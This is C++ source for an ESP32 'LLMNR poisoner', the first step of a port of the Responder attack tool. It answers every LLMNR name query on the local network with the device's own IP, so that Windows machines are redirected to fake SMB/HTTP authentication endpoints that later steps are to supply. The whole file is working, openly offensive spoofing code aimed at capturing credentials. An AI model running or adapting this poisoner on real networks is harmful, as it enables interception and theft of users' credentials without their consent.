// rESPonder32 — Step 1: LLMNR Poisoner
//
// Binds to 224.0.0.252:5355 (multicast), responds to every name query with
// our IP. Windows machines that fail DNS lookups fall back to LLMNR; this
// sketch makes us the authoritative answer for every name, steering those
// connections to our fake SMB/HTTP auth endpoints (later steps).
//
// Protocol: RFC 4795 — Link-Local Multicast Name Resolution
// Packet format: DNS wire format (length-prefixed labels, 12-byte header)
//
// Build & run (emulator):
//   cd /home/machine/esp32emu && ./esp32emu run examples/llmnr_poisoner.cpp
//
// On real ESP32: same file, Arduino IDE or PlatformIO, set WIFI_SSID/PASS.

#include <Arduino.h>
#include <WiFi.h>
#include <WiFiUDP.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>

// ---------------------------------------------------------------------------
// Config
// ---------------------------------------------------------------------------

static const char* WIFI_SSID = "YourSSID";
static const char* WIFI_PASS = "YourPassword";

static const IPAddress LLMNR_MCAST(224, 0, 0, 252);
static const uint16_t  LLMNR_PORT  = 5355;

// ---------------------------------------------------------------------------
// Globals
// ---------------------------------------------------------------------------

WiFiUDP llmnrUDP;
static uint8_t ourIP[4] = {127, 0, 0, 1};

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

// Returns this host's outbound LAN IP without sending any packets.
// Works by connecting a UDP socket to an external address and asking the
// kernel which local address it selected.
static void detectHostIP(uint8_t out[4]) {
    int s = socket(AF_INET, SOCK_DGRAM, 0);
    if (s < 0) return;

    struct sockaddr_in dst{};
    dst.sin_family      = AF_INET;
    dst.sin_port        = htons(53);
    inet_pton(AF_INET, "8.8.8.8", &dst.sin_addr);

    if (connect(s, (struct sockaddr*)&dst, sizeof(dst)) == 0) {
        struct sockaddr_in local{};
        socklen_t len = sizeof(local);
        if (getsockname(s, (struct sockaddr*)&local, &len) == 0) {
            uint8_t* b = (uint8_t*)&local.sin_addr.s_addr;
            out[0] = b[0]; out[1] = b[1]; out[2] = b[2]; out[3] = b[3];
        }
    }
    close(s);
}

// Parse a DNS-encoded name starting at buf[offset].
// Writes dotted-label form to name_out. Returns bytes consumed (including
// the trailing 0x00), or -1 on malformed input.
static int parseDnsName(const uint8_t* buf, int len, int offset,
                        char* name_out, int name_max) {
    int pos   = offset;
    int out   = 0;
    bool first = true;

    while (pos < len) {
        uint8_t label_len = buf[pos++];
        if (label_len == 0) break;
        if (label_len > 63) return -1;  // no pointer compression in LLMNR
        if (pos + label_len > len) return -1;

        if (!first && out < name_max - 1) name_out[out++] = '.';
        for (int i = 0; i < label_len && out < name_max - 1; i++)
            name_out[out++] = (char)buf[pos + i];

        pos  += label_len;
        first = false;
    }
    name_out[out] = '\0';
    return pos - offset;  // bytes consumed, including terminal 0x00
}

// Build an LLMNR A-record response into dst.
// Echoes the question section then appends an A answer record with our_ip.
// Returns bytes written, or -1 if the input isn't a valid A query.
static int buildLLMNRResponse(const uint8_t* query, int qlen,
                               uint8_t* dst,   int dstmax,
                               const uint8_t* our_ip4) {
    if (qlen < 12) return -1;

    uint16_t txid  = ((uint16_t)query[0] << 8) | query[1];
    uint16_t flags = ((uint16_t)query[2] << 8) | query[3];
    uint16_t qdcnt = ((uint16_t)query[4] << 8) | query[5];

    // Responder checks data[2:4] == b'\x00\x00' exactly — Windows sends
    // exactly zero flags on LLMNR queries; anything else is ignored.
    if (flags != 0x0000) return -1;
    if (qdcnt == 0)      return -1;

    // Locate question: name + QTYPE(2) + QCLASS(2)
    char dummy[256];
    int name_bytes = parseDnsName(query, qlen, 12, dummy, sizeof(dummy));
    if (name_bytes < 0) return -1;

    int qtype_off = 12 + name_bytes;
    if (qtype_off + 4 > qlen) return -1;

    uint16_t qtype = ((uint16_t)query[qtype_off] << 8) | query[qtype_off + 1];
    if (qtype != 0x0001) return -1;  // only handle A queries

    int qsec_len = name_bytes + 4;  // name + QTYPE + QCLASS

    // Helpers for big-endian writes
    int w = 0;
    auto put16 = [&](uint16_t v) {
        if (w + 2 <= dstmax) { dst[w++] = (uint8_t)(v >> 8); dst[w++] = (uint8_t)(v & 0xFF); }
    };
    auto putBuf = [&](const uint8_t* src, int n) {
        for (int i = 0; i < n && w < dstmax; i++) dst[w++] = src[i];
    };

    // Response header
    put16(txid);    // Transaction ID (echoed)
    put16(0x8000);  // Flags: QR=1 (response), all else 0
    put16(1);       // QDCOUNT = 1
    put16(1);       // ANCOUNT = 1
    put16(0);       // NSCOUNT = 0
    put16(0);       // ARCOUNT = 0

    // Echo question section verbatim
    putBuf(query + 12, qsec_len);

    // Answer: A record
    putBuf(query + 12, name_bytes);  // name (same encoding as question)
    put16(0x0001);  // TYPE  = A
    put16(0x0001);  // CLASS = IN
    put16(0x0000);  // TTL high word
    put16(30);      // TTL = 30 s
    put16(4);       // RDLENGTH = 4
    putBuf(our_ip4, 4);

    return w;
}

// ---------------------------------------------------------------------------
// Arduino entry points
// ---------------------------------------------------------------------------

void setup() {
    Serial.begin(115200);
    Serial.println("\n[rESPonder32] LLMNR Poisoner v0.1");

    WiFi.mode(WIFI_STA);
    WiFi.begin(WIFI_SSID, WIFI_PASS);
    Serial.print("[rESPonder32] Connecting to WiFi");
    while (WiFi.status() != WL_CONNECTED) {
        delay(100);
        Serial.print('.');
    }
    Serial.println();

    detectHostIP(ourIP);
    Serial.printf("[rESPonder32] Host IP: %d.%d.%d.%d\n",
                  ourIP[0], ourIP[1], ourIP[2], ourIP[3]);

    if (!llmnrUDP.beginMulticast(LLMNR_MCAST, LLMNR_PORT)) {
        Serial.println("[rESPonder32] ERROR: failed to bind LLMNR socket");
        return;
    }

    Serial.println("[rESPonder32] Listening on 224.0.0.252:5355");
    Serial.println("[rESPonder32] Poisoning all LLMNR queries -> ready");
}

void loop() {
    int plen = llmnrUDP.parsePacket();
    if (plen <= 0) {
        delay(1);
        return;
    }

    uint8_t buf[512];
    int n = llmnrUDP.read(buf, sizeof(buf));
    if (n < 12) return;

    IPAddress src     = llmnrUDP.remoteIP();
    uint16_t  srcPort = llmnrUDP.remotePort();

    // Extract name for logging (best-effort; harmless if it fails)
    char name[256] = "(unknown)";
    parseDnsName(buf, n, 12, name, sizeof(name));

    uint16_t flags = ((uint16_t)buf[2] << 8) | buf[3];
    if (flags != 0x0000) return;  // only standard queries (Windows sends exactly 0x0000)

    Serial.printf("[LLMNR] Query from %d.%d.%d.%d:%d for '%s'\n",
                  src[0], src[1], src[2], src[3], srcPort, name);

    uint8_t resp[512];
    int rlen = buildLLMNRResponse(buf, n, resp, sizeof(resp), ourIP);
    if (rlen <= 0) {
        Serial.printf("[LLMNR] Skipped (not an A query, or parse error)\n");
        return;
    }

    llmnrUDP.beginPacket(src, srcPort);
    llmnrUDP.write(resp, (size_t)rlen);
    llmnrUDP.endPacket();

    Serial.printf("[LLMNR] Poisoned -> %d.%d.%d.%d (%d bytes)\n",
                  ourIP[0], ourIP[1], ourIP[2], ourIP[3], rlen);
}
